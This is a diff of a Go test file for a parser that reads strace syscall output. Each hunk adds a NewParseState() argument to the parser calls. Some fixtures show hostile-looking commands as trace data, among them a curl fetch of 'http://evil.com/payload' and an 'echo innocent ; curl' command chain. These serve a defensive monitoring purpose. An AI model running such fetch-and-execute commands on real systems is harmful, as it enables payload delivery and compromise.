@@ -9,7 +9,7 @@ import (
 func TestParseStraceLine_Connect_IPv4(t *testing.T) {
 	line := `[pid 12345] connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("93.184.216.34")}, 16) = -1 ENETUNREACH`
 
-	evt, ok := parseStraceLine(line)
+	evt, ok := parseStraceLine(line, NewParseState())
 	if !ok {
 		t.Fatal("expected parse to succeed")
 	}
@@ -34,7 +34,7 @@ func TestParseStraceLine_Connect_IPv4(t *testing.T) {
 func TestParseStraceLine_Connect_IPv6(t *testing.T) {
 	line := `[pid 999] connect(5, {sa_family=AF_INET6, sin6_port=htons(80), sin6_addr=inet6_addr("::1")}, 28) = 0`
 
-	evt, ok := parseStraceLine(line)
+	evt, ok := parseStraceLine(line, NewParseState())
 	if !ok {
 		t.Fatal("expected parse to succeed")
 	}
@@ -47,7 +47,7 @@ func TestParseStraceLine_Connect_IPv6(t *testing.T) {
 func TestParseStraceLine_Sendto(t *testing.T) {
 	line := `[pid 500] sendto(4, "\0\0\1\0\0\1...", 29, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, 16) = 29`
 
-	evt, ok := parseStraceLine(line)
+	evt, ok := parseStraceLine(line, NewParseState())
 	if !ok {
 		t.Fatal("expected sendto parse to succeed")
 	}
@@ -68,7 +68,7 @@ func TestParseStraceLine_Sendto(t *testing.T) {
 func TestParseStraceLine_Execve(t *testing.T) {
 	line := `[pid 777] execve("/usr/bin/curl", ["curl", "http://evil.com/payload"], 0x...) = 0`
 
-	evt, ok := parseStraceLine(line)
+	evt, ok := parseStraceLine(line, NewParseState())
 	if !ok {
 		t.Fatal("expected execve parse to succeed")
 	}
@@ -99,7 +99,7 @@ func TestParseStraceLine_Irrelevant(t *testing.T) {
 	}
 
 	for _, line := range lines {
-		if _, ok := parseStraceLine(line); ok {
+		if _, ok := parseStraceLine(line, NewParseState()); ok {
 			t.Errorf("expected parse to fail for %q", line)
 		}
 	}
@@ -114,7 +114,7 @@ func TestParseStraceLine_ExecveFailedENOENT(t *testing.T) {
 	}
 
 	for _, line := range lines {
-		if _, ok := parseStraceLine(line); ok {
+		if _, ok := parseStraceLine(line, NewParseState()); ok {
 			t.Errorf("expected failed execve to be skipped: %s", line)
 		}
 	}
@@ -124,7 +124,7 @@ func TestParseStraceLine_ExecveSuccess(t *testing.T) {
 	// Successful execve (= 0) should be parsed.
 	line := `[pid    34] execve("/bin/sh", ["sh", "-c", "--", "echo innocent ; curl http://198."], 0x7fff29c11690 /* 8 vars */) = 0`
 
-	evt, ok := parseStraceLine(line)
+	evt, ok := parseStraceLine(line, NewParseState())
 	if !ok {
 		t.Fatal("expected successful execve to be parsed")
 	}
@@ -181,7 +181,7 @@ func TestParseStraceLine_OpenatSensitive(t *testing.T) {
 
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
-			evt, ok := parseStraceLine(tc.line)
+			evt, ok := parseStraceLine(tc.line, NewParseState())
 			if !ok {
 				t.Fatal("expected parse to succeed")
 			}
@@ -207,7 +207,7 @@ func TestParseStraceLine_OpenatNonSensitive(t *testing.T) {
 	}
 
 	for _, line := range lines {
-		if _, ok := parseStraceLine(line); ok {
+		if _, ok := parseStraceLine(line, NewParseState()); ok {
 			t.Errorf("expected non-sensitive openat to be skipped: %s", line)
 		}
 	}
@@ -248,7 +248,7 @@ func TestParseStraceLine_Rename(t *testing.T) {
 
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
-			evt, ok := parseStraceLine(tc.line)
+			evt, ok := parseStraceLine(tc.line, NewParseState())
 			if !ok {
 				t.Fatal("expected parse to succeed")
 			}
@@ -375,7 +375,7 @@ func TestUnescapeStraceBuf(t *testing.T) {
 func TestParseStraceLine_NoPID(t *testing.T) {
 	line := `connect(3, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("127.0.0.1")}, 16) = 0`
 
-	evt, ok := parseStraceLine(line)
+	evt, ok := parseStraceLine(line, NewParseState())
 	if !ok {
 		t.Fatal("expected parse to succeed")
 	}
